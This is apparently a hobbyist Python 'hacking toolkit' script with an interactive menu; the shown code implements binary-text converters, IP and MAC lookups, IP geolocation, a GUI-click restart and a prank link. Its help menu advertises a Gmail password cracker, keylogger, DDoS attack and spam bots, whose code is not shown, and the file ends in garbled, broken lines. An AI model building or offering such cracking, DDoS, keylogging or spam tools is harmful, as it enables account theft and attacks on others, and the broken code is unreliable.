import socket
import smtplib
import time
import math
import random
import os
import logging
import threading
import hashlib
import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
try:
    import getmac
    import geocoder
    import publicip
    import pyautogui
    import pytube
    import pywhatkit
    import pythonping
    from pynput.keyboard import Listener
    from PIL import Image
except:
    if ModuleNotFoundError:
        os.system('pip install getmac')
        os.system('pip install geocoder')
        os.system('pip install publicip')
        os.system('pip install pyautogui')
        os.system('pip install pytube')
        os.system('pip install pywhatkit')
        os.system('pip install pythonping')
        os.system('pip install pynput')
        os.system('pip install pillow')
    else:
        pass
def binarytostr(binary):
    thing = binary.split()
    binarytostrdo(thing)
def strtobinary(phrase):
    while True:
        try:
            def translate(phrase):
                translation = ""
                for letter in phrase:
                    if letter in "a":
                        translation = translation + " 01100001"
                    if letter in "b":
                        translation = translation + " 01100010"
                    if letter in "c":
                        translation = translation + " 01100011"
                    if letter in "d":
                        translation = translation + " 01100100"
                    if letter in "e":
                        translation = translation + " 01100101"
                    if letter in "f":
                        translation = translation + " 01100110"
                    if letter in "g":
                        translation = translation + " 01100111"
                    if letter in "h":
                        translation = translation + " 01101000"
                    if letter in "i":
                        translation = translation + " 01101001"
                    if letter in "j":
                        translation = translation + " 01101010"
                    if letter in "k":
                        translation = translation + " 01101011"
                    if letter in "l":
                        translation = translation + " 01101100"
                    if letter in "m":
                        translation = translation + " 01101101"
                    if letter in "n":
                        translation = translation + " 01101110"
                    if letter in "o":
                        translation = translation + " 01101111"
                    if letter in "p":
                        translation = translation + " 01110000"
                    if letter in "q":
                        translation = translation + " 01110001"
                    if letter in "r":
                        translation = translation + " 01110010"
                    if letter in "s":
                        translation = translation + " 01110011"
                    if letter in "t":
                        translation = translation + " 01110100"
                    if letter in "u":
                        translation = translation + " 01110101"
                    if letter in "v":
                        translation = translation + " 01110110"
                    if letter in "w":
                        translation = translation + " 01110111"
                    if letter in "x":
                        translation = translation + " 01111000"
                    if letter in "y":
                        translation = translation + " 01111001"
                    if letter in "z":
                        translation = translation + " 01111010"

                    if letter in "A":
                        translation = translation + " 01000001"
                    if letter in "B":
                        translation = translation + " 01000010"
                    if letter in "C":
                        translation = translation + " 01000011"
                    if letter in "D":
                        translation = translation + " 01000100"
                    if letter in "E":
                        translation = translation + " 01000101"
                    if letter in "F":
                        translation = translation + " 01000110"
                    if letter in "G":
                        translation = translation + " 01000111"
                    if letter in "H":
                        translation = translation + " 01001000"
                    if letter in "I":
                        translation = translation + " 01001001"
                    if letter in "J":
                        translation = translation + " 01001010"
                    if letter in "K":
                        translation = translation + " 01001011"
                    if letter in "L":
                        translation = translation + " 01001100"
                    if letter in "M":
                        translation = translation + " 01001101"
                    if letter in "N":
                        translation = translation + " 01001110"
                    if letter in "O":
                        translation = translation + " 01001111"
                    if letter in "P":
                        translation = translation + " 01010000"
                    if letter in "Q":
                        translation = translation + " 01010001"
                    if letter in "R":
                        translation = translation + " 01010010"
                    if letter in "S":
                        translation = translation + " 01010011"
                    if letter in "T":
                        translation = translation + " 01010100"
                    if letter in "U":
                        translation = translation + " 01010101"
                    if letter in "V":
                        translation = translation + " 01010110"
                    if letter in "W":
                        translation = translation + " 01010111"
                    if letter in "X":
                        translation = translation + " 01011000"
                    if letter in "Y":
                        translation = translation + " 01011001"
                    if letter in "Z":
                        translation = translation + " 01011010"
                    if letter in "1":
                        translation = translation + " 00110001"
                    if letter in "2":
                        translation = translation + " 00110010"
                    if letter in "3":
                        translation = translation + " 00110011"
                    if letter in "4":
                        translation = translation + " 00110100"
                    if letter in "5":
                        translation = translation + " 00110101"
                    if letter in "6":
                        translation = translation + " 00110110"
                    if letter in "7":
                        translation = translation + " 00110111"
                    if letter in "8":
                        translation = translation + " 00111000"
                    if letter in "9":
                        translation = translation + " 00111001"
                    if letter in "0":
                        translation = translation + " 00110000"
                    if letter in " ":
                        translation = translation + " 00100000"
                    if letter in ".":
                        translation = translation + " 00101110"
                    if letter in "'":
                        translation = translation + " 00100111"
                    if letter in "?":
                        translation = translation + " 00111111"
                    if letter in "(":
                        translation = translation + " 00101000"
                    if letter in ")":
                        translation = translation + " 00101001"
                    if letter in "!":
                        translation = translation + " 00100001"
                    if letter in ",":
                        translation = translation + " 00101100"
                    if letter in "[":
                        translation = translation + " 01011011"
                    if letter in "]":
                        translation = translation + " 01011101"
                    if letter in "+":
                        translation = translation + " 00101011"
                    if letter in '"':
                        translation = translation + " 00100010"
                    else:
                        pass
                return translation
            phrase = translate(phrase)
            print(f"[+] The translation to Binary is:{phrase}")
            break
        except:
            pass
def strtobinarynospace(phrase):
    while True:
        try:
            def translate(phrase): #slightly different
                translation = ""
                for letter in phrase:
                    if letter in "a":
                        translation = translation + "01100001"
                    if letter in "b":
                        translation = translation + "01100010"
                    if letter in "c":
                        translation = translation + "01100011"
                    if letter in "d":
                        translation = translation + "01100100"
                    if letter in "e":
                        translation = translation + "01100101"
                    if letter in "f":
                        translation = translation + "01100110"
                    if letter in "g":
                        translation = translation + "01100111"
                    if letter in "h":
                        translation = translation + "01101000"
                    if letter in "i":
                        translation = translation + "01101001"
                    if letter in "j":
                        translation = translation + "01101010"
                    if letter in "k":
                        translation = translation + "01101011"
                    if letter in "l":
                        translation = translation + "01101100"
                    if letter in "m":
                        translation = translation + "01101101"
                    if letter in "n":
                        translation = translation + "01101110"
                    if letter in "o":
                        translation = translation + "01101111"
                    if letter in "p":
                        translation = translation + "01110000"
                    if letter in "q":
                        translation = translation + "01110001"
                    if letter in "r":
                        translation = translation + "01110010"
                    if letter in "s":
                        translation = translation + "01110011"
                    if letter in "t":
                        translation = translation + "01110100"
                    if letter in "u":
                        translation = translation + "01110101"
                    if letter in "v":
                        translation = translation + "01110110"
                    if letter in "w":
                        translation = translation + "01110111"
                    if letter in "x":
                        translation = translation + "01111000"
                    if letter in "y":
                        translation = translation + "01111001"
                    if letter in "z":
                        translation = translation + "01111010"

                    if letter in "A":
                        translation = translation + "01000001"
                    if letter in "B":
                        translation = translation + "01000010"
                    if letter in "C":
                        translation = translation + "01000011"
                    if letter in "D":
                        translation = translation + "01000100"
                    if letter in "E":
                        translation = translation + "01000101"
                    if letter in "F":
                        translation = translation + "01000110"
                    if letter in "G":
                        translation = translation + "01000111"
                    if letter in "H":
                        translation = translation + "01001000"
                    if letter in "I":
                        translation = translation + "01001001"
                    if letter in "J":
                        translation = translation + "01001010"
                    if letter in "K":
                        translation = translation + "01001011"
                    if letter in "L":
                        translation = translation + "01001100"
                    if letter in "M":
                        translation = translation + "01001101"
                    if letter in "N":
                        translation = translation + "01001110"
                    if letter in "O":
                        translation = translation + "01001111"
                    if letter in "P":
                        translation = translation + "01010000"
                    if letter in "Q":
                        translation = translation + "01010001"
                    if letter in "R":
                        translation = translation + "01010010"
                    if letter in "S":
                        translation = translation + "01010011"
                    if letter in "T":
                        translation = translation + "01010100"
                    if letter in "U":
                        translation = translation + "01010101"
                    if letter in "V":
                        translation = translation + "01010110"
                    if letter in "W":
                        translation = translation + "01010111"
                    if letter in "X":
                        translation = translation + "01011000"
                    if letter in "Y":
                        translation = translation + "01011001"
                    if letter in "Z":
                        translation = translation + "01011010"
                    if letter in "1":
                        translation = translation + "00110001"
                    if letter in "2":
                        translation = translation + "00110010"
                    if letter in "3":
                        translation = translation + "00110011"
                    if letter in "4":
                        translation = translation + "00110100"
                    if letter in "5":
                        translation = translation + "00110101"
                    if letter in "6":
                        translation = translation + "00110110"
                    if letter in "7":
                        translation = translation + "00110111"
                    if letter in "8":
                        translation = translation + "00111000"
                    if letter in "9":
                        translation = translation + "00111001"
                    if letter in "0":
                        translation = translation + "00110000"
                    if letter in " ":
                        translation = translation + "00100000"
                    if letter in ".":
                        translation = translation + "00101110"
                    if letter in "'":
                        translation = translation + "00100111"
                    if letter in "?":
                        translation = translation + "00111111"
                    if letter in "(":
                        translation = translation + "00101000"
                    if letter in ")":
                        translation = translation + "00101001"
                    if letter in "!":
                        translation = translation + "00100001"
                    if letter in ",":
                        translation = translation + "00101100"
                    if letter in "[":
                        translation = translation + "01011011"
                    if letter in "]":
                        translation = translation + "01011101"
                    if letter in "+":
                        translation = translation + "00101011"
                    if letter in '"':
                        translation = translation + "00100010"
                    else:
                        pass
                return translation
            phrase = translate(phrase)
            print(f"[+] The translation to Binary is: {phrase}")
            break
        except:
            pass
def binarytostrnospace(binary):
    while True:
        try:
            thing = list(binary)
            list_count = len(thing)
            binary_count = 0
            result = ""
            stop = False
            try:
                checker = int(thing[0])
            except:
                print("[+] You need to put proper binary code without spaces.")
                break
            while not stop:
                try:
                    for i in range(8):
                        result = result + thing[0]
                        del thing[0]
                        binary_count += 1
                    result = result + " "
                    if binary_count == list_count:
                        thing = result.split()
                        list_count = len(thing)
                        binarytostrdo(thing)
                        stop = True
                        break
                except:
                    break
            if stop:
                break
        except:
            break
def binarytostrdo(thing):
    while True:
        try:
            list_count = len(thing)
            list_binary = ["01000001", "01000010", "01000011", "01000100", "01000101", "01000110", "01000111",
                           "01001000",
                           "01001001", "01001010", "01001011", "01001100", "01001101", "01001110", "01001111",
                           "01010000",
                           "01010001", "01010010", "01010011", "01010100", "01010101", "01010110", "01010111",
                           "01011000",
                           "01011001", "01011010"]
            list_binary2 = ["01100001", "01100010", "01100011", "01100100", "01100101", "01100110", "01100111",
                            "01101000",
                            "01101001", "01101010", "01101011", "01101100", "01101101", "01101110", "01101111",
                            "01110000",
                            "01110001", "01110010", "01110011", "01110100", "01110101", "01110110", "01110111",
                            "01111000",
                            "01111001", "01111010"]
            list_binary3 = ["00110001", "00110010", "00110011", "00110100", "00110101", "00110110", "00110111",
                            "00111000", "00111001", "00110000"]
            binary_space = "00100000"
            binary_period = "00101110"
            binary_apostraphe = "00100111"
            binary_quest = "00111111"
            binary_parenthases = ["00101000", "00101001"]  # ( )
            list_binary11 = ["1000001", "1000010", "1000011", "1000100", "1000101", "1000110", "1000111",
                             "1001000",
                             "1001001", "1001010", "1001011", "1001100", "1001101", "1001110", "1001111",
                             "1010000",
                             "1010001", "1010010", "1010011", "1010100", "1010101", "1010110", "1010111",
                             "1011000",
                             "1011001", "1011010"]
            list_binary22 = ["1100001", "1100010", "1100011", "1100100", "1100101", "1100110", "1100111",
                             "1101000",
                             "1101001", "1101010", "1101011", "1101100", "1101101", "1101110", "1101111",
                             "1110000",
                             "1110001", "1110010", "1110011", "1110100", "1110101", "1110110", "1110111",
                             "1111000",
                             "1111001", "1111010"]
            list_binary33 = ["0110001", "0110010", "0110011", "0110100", "0110101", "0110110", "0110111",
                             "0111000", "0111001", "0110000"]
            binary_space2 = "0100000"
            binary_period2 = "0101110"
            binary_apostraphe2 = "0100111"
            binary_quest2 = "0111111"
            binary_parenthases2 = ["0101000", "0101001"]  # ( )
            binary_exclamation = "00100001"
            binary_exclamation2 = "0100001"
            binary_comma = "00101100"
            binary_comma2 = "0101100"
            binary_sqaurebracks = ['01011011', "01011101"]#[]
            binary_sqaurebracks2 = ['1011011', "1011101"]
            binary_plus = "00101011"
            binary_plus2 = "0101011"
            binary_quot = "00100010"
            binary_quot2 = "0100010"
            translation = ""
            for i in range(list_count):
                if thing[i] == list_binary[0] or thing[i] == list_binary11[0]:
                    translation = translation + "A"
                elif thing[i] == list_binary[1] or thing[i] == list_binary11[1]:
                    translation = translation + "B"
                elif thing[i] == list_binary[2] or thing[i] == list_binary11[2]:
                    translation = translation + "C"
                elif thing[i] == list_binary[3] or thing[i] == list_binary11[3]:
                    translation = translation + "D"
                elif thing[i] == list_binary[4] or thing[i] == list_binary11[4]:
                    translation = translation + "E"
                elif thing[i] == list_binary[5] or thing[i] == list_binary11[5]:
                    translation = translation + "F"
                elif thing[i] == list_binary[6] or thing[i] == list_binary11[6]:
                    translation = translation + "G"
                elif thing[i] == list_binary[7] or thing[i] == list_binary11[7]:
                    translation = translation + "H"
                elif thing[i] == list_binary[8] or thing[i] == list_binary11[8]:
                    translation = translation + "I"
                elif thing[i] == list_binary[9] or thing[i] == list_binary11[9]:
                    translation = translation + "J"
                elif thing[i] == list_binary[10] or thing[i] == list_binary11[10]:
                    translation = translation + "K"
                elif thing[i] == list_binary[11] or thing[i] == list_binary11[11]:
                    translation = translation + "L"
                elif thing[i] == list_binary[12] or thing[i] == list_binary11[12]:
                    translation = translation + "M"
                elif thing[i] == list_binary[13] or thing[i] == list_binary11[13]:
                    translation = translation + "N"
                elif thing[i] == list_binary[14] or thing[i] == list_binary11[14]:
                    translation = translation + "O"
                elif thing[i] == list_binary[15] or thing[i] == list_binary11[15]:
                    translation = translation + "P"
                elif thing[i] == list_binary[16] or thing[i] == list_binary11[16]:
                    translation = translation + "Q"
                elif thing[i] == list_binary[17] or thing[i] == list_binary11[17]:
                    translation = translation + "R"
                elif thing[i] == list_binary[18] or thing[i] == list_binary11[18]:
                    translation = translation + "S"
                elif thing[i] == list_binary[19] or thing[i] == list_binary11[19]:
                    translation = translation + "T"
                elif thing[i] == list_binary[20] or thing[i] == list_binary11[20]:
                    translation = translation + "U"
                elif thing[i] == list_binary[21] or thing[i] == list_binary11[21]:
                    translation = translation + "V"
                elif thing[i] == list_binary[22] or thing[i] == list_binary11[22]:
                    translation = translation + "W"
                elif thing[i] == list_binary[23] or thing[i] == list_binary11[23]:
                    translation = translation + "X"
                elif thing[i] == list_binary[24] or thing[i] == list_binary11[24]:
                    translation = translation + "Y"
                elif thing[i] == list_binary[25] or thing[i] == list_binary11[25]:
                    translation = translation + "Z"

                elif thing[i] == list_binary2[0] or thing[i] == list_binary22[0]:
                    translation = translation + "a"
                elif thing[i] == list_binary2[1] or thing[i] == list_binary22[1]:
                    translation = translation + "b"
                elif thing[i] == list_binary2[2] or thing[i] == list_binary22[2]:
                    translation = translation + "c"
                elif thing[i] == list_binary2[3] or thing[i] == list_binary22[3]:
                    translation = translation + "d"
                elif thing[i] == list_binary2[4] or thing[i] == list_binary22[4]:
                    translation = translation + "e"
                elif thing[i] == list_binary2[5] or thing[i] == list_binary22[5]:
                    translation = translation + "f"
                elif thing[i] == list_binary2[6] or thing[i] == list_binary22[6]:
                    translation = translation + "g"
                elif thing[i] == list_binary2[7] or thing[i] == list_binary22[7]:
                    translation = translation + "h"
                elif thing[i] == list_binary2[8] or thing[i] == list_binary22[8]:
                    translation = translation + "i"
                elif thing[i] == list_binary2[9] or thing[i] == list_binary22[9]:
                    translation = translation + "j"
                elif thing[i] == list_binary2[10] or thing[i] == list_binary22[10]:
                    translation = translation + "k"
                elif thing[i] == list_binary2[11] or thing[i] == list_binary22[11]:
                    translation = translation + "l"
                elif thing[i] == list_binary2[12] or thing[i] == list_binary22[12]:
                    translation = translation + "m"
                elif thing[i] == list_binary2[13] or thing[i] == list_binary22[13]:
                    translation = translation + "n"
                elif thing[i] == list_binary2[14] or thing[i] == list_binary22[14]:
                    translation = translation + "o"
                elif thing[i] == list_binary2[15] or thing[i] == list_binary22[15]:
                    translation = translation + "p"
                elif thing[i] == list_binary2[16] or thing[i] == list_binary22[16]:
                    translation = translation + "q"
                elif thing[i] == list_binary2[17] or thing[i] == list_binary22[17]:
                    translation = translation + "r"
                elif thing[i] == list_binary2[18] or thing[i] == list_binary22[18]:
                    translation = translation + "s"
                elif thing[i] == list_binary2[19] or thing[i] == list_binary22[19]:
                    translation = translation + "t"
                elif thing[i] == list_binary2[20] or thing[i] == list_binary22[20]:
                    translation = translation + "u"
                elif thing[i] == list_binary2[21] or thing[i] == list_binary22[21]:
                    translation = translation + "v"
                elif thing[i] == list_binary2[22] or thing[i] == list_binary22[22]:
                    translation = translation + "w"
                elif thing[i] == list_binary2[23] or thing[i] == list_binary22[23]:
                    translation = translation + "x"
                elif thing[i] == list_binary2[24] or thing[i] == list_binary22[24]:
                    translation = translation + "y"
                elif thing[i] == list_binary2[25] or thing[i] == list_binary22[25]:
                    translation = translation + "z"

                elif thing[i] == list_binary3[0] or thing[i] == list_binary33[0]:
                    translation = translation + "1"
                elif thing[i] == list_binary3[1] or thing[i] == list_binary33[1]:
                    translation = translation + "2"
                elif thing[i] == list_binary3[2] or thing[i] == list_binary33[2]:
                    translation = translation + "3"
                elif thing[i] == list_binary3[3] or thing[i] == list_binary33[3]:
                    translation = translation + "4"
                elif thing[i] == list_binary3[4] or thing[i] == list_binary33[4]:
                    translation = translation + "5"
                elif thing[i] == list_binary3[5] or thing[i] == list_binary33[5]:
                    translation = translation + "6"
                elif thing[i] == list_binary3[6] or thing[i] == list_binary33[6]:
                    translation = translation + "7"
                elif thing[i] == list_binary3[7] or thing[i] == list_binary33[7]:
                    translation = translation + "8"
                elif thing[i] == list_binary3[8] or thing[i] == list_binary33[8]:
                    translation = translation + "9"
                elif thing[i] == list_binary3[9] or thing[i] == list_binary33[9]:
                    translation = translation + "0"
                elif thing[i] == binary_space or thing[i] == binary_space2:
                    translation = translation + " "
                elif thing[i] == binary_period or thing[i] == binary_period2:
                    translation = translation + "."
                elif thing[i] == binary_apostraphe or thing[i] == binary_apostraphe:
                    translation = translation + "'"
                elif thing[i] == binary_quest or thing[i] == binary_quest2:
                    translation = translation + "?"
                elif thing[i] == binary_parenthases[0] or thing[i] == binary_parenthases2[0]:
                    translation = translation + "("
                elif thing[i] == binary_parenthases[1] or thing[i] == binary_parenthases2[1]:
                    translation = translation + ")"
                elif thing[i] == binary_exclamation or thing[i] == binary_exclamation2:
                    translation = translation + "!"
                elif thing[i] == binary_comma or thing[i] == binary_comma2:
                    translation = translation + ","
                elif thing[i] == binary_sqaurebracks[0] or thing[i] == binary_sqaurebracks2[0]:
                    translation = translation + "["
                elif thing[i] == binary_sqaurebracks[1] or thing[i] == binary_sqaurebracks2[1]:
                    translation = translation + "]"
                elif thing[i] == binary_plus or thing[i] == binary_plus2:
                    translation = translation + "+"
                elif thing[i] == binary_quot or thing[i] == binary_quot2:
                    translation = translation + '"'
                else:
                    pass
            print("[+] The translation is:", translation)
            print("")
            break
        except:
            break
loop = True
trial_number = 1
print("")
print("[+] Python Tools v3.0 By DrSquid")
print("[+] Original Version")
print("[+] Using PyCharm CE is recommended(or any other IDE).")
print("[+] This works best on a Windows 10 Computer.\n[+] However it still works on MacOS.")
print("")
print("[+] You can type in the word 'help' for some info about the commands.")
print("[+] Note that this script does not work 100% of the time.")
print("[+] Also download any required modules, so that the code can fully work.")
print("[+] Just be sure that some of these tools do not work on macbooks.")
print("[+] Many of these instructions were made for educational purposes,\n[+] and if you end up doing something illegal with it, I will not be the one responsible for what has been done.")
print("")
print("[+] NOTE: All modifications of this code are no longer considered to be the Original Version.")
print("")
while loop:
    instruction = input("[+] Type in an instruction: ")
    if instruction.lower() == "help":
        print("")
        print("x---------------------------------------------------Commands-List----------------------------------------------------x")
        print("[+] Here is a list of commands.")
        print("")
        print("[+] IP Obtainers:")
        print("[+] getIPv4 - Obtains the IPv4 Address of any local device")
        print("[+] getIPv6 - Obtains the IPv6 Address of any local device")
        print("[+] ForceGetIPv4 - If there is an error, it will keep trying to find the IPv4 Address for a given amout of trials")
        print("[+] ForceGetIPv6 - If there is an error, it will keep trying to find the IPv6 Address for a given amout of trials")
        print("[+] getSelfIP - Obtains the IP of this device")
        print("[+] getSelfHostname - Obtains the Hostname of this device")
        print("[+] getDeviceInfo - Gets info about a device with the IP provided")
        print("[+] getMacAddress - Gets the MAC address of a device with a provided Hostname")
        print("[+] getDomainIP - Gets the IP from a provided domain name")
        print("[+] TrackIP - Tracks the location of a give IP")
        print("[+] getHostbyAddr - Gets the host of a computer by its IP address")
        print("[+] getPing - Gets the ping of a device(only on windows)")
        print("")
        print("[+] Cyber Security, Hacking and Spyware:")
        print("[+] bash - Opens up terminal")
        print("[+] generatePassword - Generates a secure password for you")
        print("[+] passwordCracker - Launches dictionary attack on a gmail account to find its password")
        print("[+] dictionaryAttackTester - Tests a dictionary attack on a inputted password")
        print("[+] txtfilePasswordCracker - Launches dictionary attack on gmail account to find its password using a text file that has passwords")
        print("[+] keyLogger - Makes a log on what keys you press on your computer")
        print("[+] DDoSAttack - Does a DDoS attack on an IP address")
        print("[+] MD5ToStr - Does a dictionary attack on a provided MD5 hash to find the String version of it")
        print("[+] strToMD5 - Turns a String into an MD5 Hash")
        print("")
        print("[+] Bots And Automatic Stuff:")
        print("[+] asciiArt - Allow the computer to make ascii art on an image(putting the image file in the venv folder is suggested)")
        print("[+] restartComputer - Restarts your computer")
        print("[+] rickRoll - Rick Astley has come to bully.")
        print("[+] writeEmail - Write an email and send it to someone")
        print("[+] emailSpamBot - Spam bot an email")
        print("[+] discordSpamBot - Spam people in discord with a spam bot")
        print("[+] beeMovieSpambot - Spam peeople with the Bee Movie Script!(requires a txt file called 'beemovie.txt')")
        print("[+] antiAFKmcBot - Anti-AFK kick bot for Minecraft Servers")
        print("[+] discordCountBot - Bot that counts numbers by 1")
        print("[+] autoClicker - Allows you click at up to 20 cps")
        print("[+] sendWhatsApp - Sends a whatsapp message to a typed in number (you need to be logged into WhatApp web)")
        print("")
        print("[+] Random Tools:")
        print("[+] namePicker - Random name picker")
        print("[+] calc - Simple math calculator")
        print("[+] brailleCalc - Calculator to find how many braille combos for how many dots it has")
        print("[+] slopeCalc - Calculator to find the slope of 2 provided points")
        print("[+] circumfranceCalc - Calculates the circumfrance of a circle with a given diameter")
        print("[+] circleAreaCalc - Calculates the area of a cirlce with a given radius")
        print("[+] listAveragleCalc - Calculator to find the average of a list")
        print("[+] groupCreator - Group creator for groups of 2")
        print("[+] diceRoller - Picks a random number from a selected range")
        print("[+] daysUntilCalc - Calculator to find the days until something")
        print("")
        print("[+] Other Tech Related Stuff:")
        print("[+] binaryToStr - Translates binary to a string")
        print("[+] binaryToStrNoSpace - Translates binary without spaces into a string")
        print("[+] strToBinary - Translates a string to binary")
        print("[+] strToBinaryNoSpace - Translates a string into binary code that does not have spaces")
        print("[+] getCPUthreadcount - Counts how many threads your cpu has")
        print("[+] downloadYTvid - Downloads Youtube videos")
        print("")
        print("[+] Other Stuff:")
        print("[+] downloadInfo - Gives info about downloading modules")
        print("[+] devDiscord - Get the Developer's Discord(if you have any errors)")
        print("[+] changelog - Shows what has been changed in the script")
        print("[+] Quit - Quits the code")
        print("")
        print("x--------------------------------------------------------------------------------------------------------------------x")
        print("")
    elif instruction.lower() == "getipv4":
        device_name = input("[+] What is the device name?: ")
        try:
            IP = socket.getaddrinfo(device_name, 8080, socket.AF_INET)
            print("[+] This device is online.")
            print("[+] Info About Device:", IP)
            print("")
        except:
            print("[+] Unable to find the device.")
            print("[+] The device might not be online, or you may have typed in the hostname incorrectly.")
            print("")
    elif instruction.lower() == "getipv6":
        device_name = input("What is the device name?: ")
        try:
            IP = socket.getaddrinfo(device_name, 8080, socket.AF_INET6)
            print("[+] This device is online.")
            print("[+] Info About Device:", IP)
            print("")
        except:
            print("[+] Unable to find the device.")
            print("[+] The device might not be online, or you may have typed in the hostname incorrectly.")
            print("")
    elif instruction.lower() == "forcegetipv4":
        device_name = input("[+] What is the device name?: ")
        loop2 = True
        while loop2:
            try:
                trials = int(input("[+] How many times should I try to grab the IP?: "))
                trial_number = 1
                loop2 = False
            except:
                print("[+] Invalid Input.")
        success = False
        loop3 = True
        while loop3:
            print("[+] Trial:", trial_number)
            try:
                IP = socket.getaddrinfo(device_name, 8080, socket.AF_INET)
                loop3 = False
                print("[+] The IP was found after", trial_number, "trials.")
                print("[+] This device is online.")
                print("[+] Info About Device:", IP)
                print("")
            except:
                print("[+] There was an error with getting the address.")
                print("[+] Attempting to identify the IP address again....")
                trial_number += 1
                if trial_number > trials:
                    print("")
                    print("[+] I was unable to get the IP of the device after the amount of trials.")
                    loop3 = False
                print("")
    elif instruction.lower() == "forcegetipv6":
        device_name = input("[+] What is the device name?: ")
        loop2 = True
        while loop2:
            try:
                trials = int(input("[+] How many times should I try to grab the IP?: "))
                trial_number = 1
                loop2 = False
            except:
                print("[+] Invalid Input.")
        success = False
        loop3 = True
        while loop3:
            print("[+] Trial:", trial_number)
            try:
                IP = socket.getaddrinfo(device_name, 8080, socket.AF_INET6)
                loop3 = False
                print("[+] The IP was found after", trial_number, "trials.")
                print("[+] This device is online.")
                print("[+] Info About Device:", IP)
                print("")
            except:
                if AttributeError:
                    print("[+] There is likely to be a circular import. This initialized module has a missing attribute and is unable to use it.")
                print("[+] There was an error with getting the address.")
                print("[+] Attempting to identify the IP address again....")
                trial_number += 1
                if trial_number > trials:
                    print("")
                    print("[+] I was unable to get the IP of the device after the amount of trials.")
                    loop3 = False
                print("")
    elif instruction.lower() == "getselfip":
        IP = socket.gethostbyname(socket.gethostname())
        try:
            print("[+] Your local IP is:")
            print(IP)
            print("[+] Your External IP is:")
            publicip.get()
            print("")
        except:
            if ModuleNotFoundError:
                print("")
                print("[+] There is a missing Module.")
                print("[+] Modules That May Require Downloading: publicip")
                print("[+] How To Download Them:")
                print("[+] Write this command in the pycharm terminal(should be located on the bottom somewhere): pip install publicip")
                print("")
            elif AttributeError:
                print("[+] There is likely to be a circular import. This initialized module has a missing attribute and is unable to use it.")
            else:
                print("[+] There was an error with getting your IP.")
                print("")
    elif instruction.lower() == "getselfhostname":
        hostname = socket.gethostname()
        try:
            print("[+] Your Hostname is:", hostname + ".")
            print("")
        except:
            if AttributeError:
                print("[+] There is likely to be a circular import. This initialized module has a missing attribute and is unable to use it.")
            print("[+] There was an error with getting your Hostname.")
            print("")
    elif instruction.lower() == "getdeviceinfo":
        device_ip = input("[+] Enter the IP of the device: ")
        try:
            device_ip = socket.gethostbyname(device_ip)
            IP = socket.gethostbyaddr(device_ip)
            print("[+] This device is online.")
            print("[+] Here is some info about the device:", IP)
            print("")
        except:
            if AttributeError:
                print("[+] There is likely to be a circular import. This initialized module has a missing attribute and is unable to use it.")
            else:
                print("[+] Unable to find any Info.")
                print("[+] The device might not be online, or you may have typed in the IP incorrectly.")
                print("")

    elif instruction.lower() == "getmacaddress":
        device_name = input("[+] Enter the name of the device: ")
        try:
            mac_address = getmac.get_mac_address(hostname=f"{device_name}")
            print("[+] The MAC address for the Hostname (", device_name, ") is:", mac_address)
            print("")
        except:
            if ModuleNotFoundError:
                print("")
                print("[+] There is a missing Module.")
                print("[+] Modules That May Require Downloading: getmac")
                print("[+] How To Download Them:")
                print("[+] Write this command in the pycharm terminal(should be located on the bottom somewhere): pip install getmac")
                print("")
            elif AttributeError:
                print("[+] There is likely to be a circular import. This initialized module has a missing attribute and is unable to use it.")
            else:
                print("[+] Unable to find the MAC address of the hostname. Try retyping it.")
                print("")
    elif instruction.lower() == "getdomainip":
        domain = input("[+] What is the domain name?: ")
        try:
            IP = socket.gethostbyname(domain)
            print("[+] The IP Address for (", domain, ") is", IP+".")
            print("")
        except:
            if AttributeError:
                print("[+] There is likely to be a circular import. This initialized module has a missing attribute and is unable to use it.")
            print("[+] Unable to find the IP Address for the provided domain. Please try retyping it or checking for any spelling errors.")
            print("")
    elif instruction.lower() == "trackip":
        IP = input("[+] What is the IP that you want to be located?: ")
        try:
            IP = socket.gethostbyname(IP)
            IP = geocoder.ip(IP)
            print("[+] Latitude, Longitude = ",IP.latlng)
            print("[+] Location Info:\n",IP.geojson)
            print("")
        except:
            if ModuleNotFoundError:
                print("")
                print("[+] There is a missing Module.")
                print("[+] Modules That May Require Downloading: geocoder")
                print("[+] How To Download Them:")
                print("[+] Write this command in the pycharm terminal(should be located on the bottom somewhere): pip install geocoder")
                print("")
            elif AttributeError:
                print("[+] There is likely to be a circular import. This initialized module has a missing attribute and is unable to use it.")
            else:
                print("[+] There was as error with getting the location info of the IP address.")
                print("[+] Perhaps try re-entering it.")
                print("")
    elif instruction.lower() == "restartcomputer":
        loop2 = True
        while loop2:
            platform = input("[+] What platform are you using this code from?(mac/windows/exit): ")
            if platform.lower() == "windows":
                pyautogui.click(15, 1054)
                time.sleep(0.05)
                pyautogui.click(20, 1008)
                time.sleep(0.05)
                pyautogui.click(32, 963)
                time.sleep(0.02)
                pyautogui.click(32, 963)
                quit()
            elif platform.lower() == "mac":
                pyautogui.click(20, 9)
                time.sleep(0.01)
                pyautogui.click(144, 144)
                time.sleep(0.01)
                pyautogui.click(1334, 690)
                time.sleep(0.01)
                pyautogui.click(1597, 977)
                time.sleep(0.01)
                pyautogui.click(1579, 731)
                time.sleep(0.01)
                pyautogui.click()
                time.sleep(0.01)
                pyautogui.click(20, 9)
                time.sleep(0.01)
                pyautogui.click(86, 196)
                time.sleep(0.01)
                pyautogui.click(969, 388)
                time.sleep(1)
                pyautogui.click(969, 388)
                time.sleep(1)
                pyautogui.click(1003, 363)
                time.sleep(0.01)
                pyautogui.click(1246, 162)
                quit()
            elif platform.lower() == "exit":
                loop2 = False
                print("[+] Good choice not to restart your computer.")
                print("")
            else:
                print("[+] Invalid Input.")
    elif instruction.lower() == "rickroll":
        loop2 = True
        while loop2:
            try:
                platform = input("[+] What platform are you using this code from?(mac/windows/exit): ")
                if platform.lower() == "windows":
                    pyautogui.press("win")
                    time.sleep(0.001)
                    pyautogui.typewrite("https://www.latlmes.com/breaking/news-1")
                    time.sleep(0.001)
                    pyautogui.press("enter")
                    time.sleep(0.001)
                    pyautogui.press("enter")
                    loop2 = False
                    print("")
                elif platform.lower() == "mac":
                    print("[+] This feature is still in development.")
                    print("")
                elif platform.lower() == "exit":
                    loop2 = False
                    print("[+] You avoided a Rick Roll, nice job.")
                    print("")
                else:
                    print("[+] Invalid Input.")
            except:
                if ModuleNotFoundError:
                    print("[+] Modules That May Require Downloading: pyautogui")
                    print("[+] How To Download Them:")
                    print("[+] Write this command in the pycharm terminal(should be located on the bottom somewhere): pip install pyautogui")
                    print("")
                elif AttributeError:
                    pr
                    priint("[+] There is likely to be a circular import. This initialized module has a missing attribute and is unable to use it.")
                else:nt("[+] There was an error.")
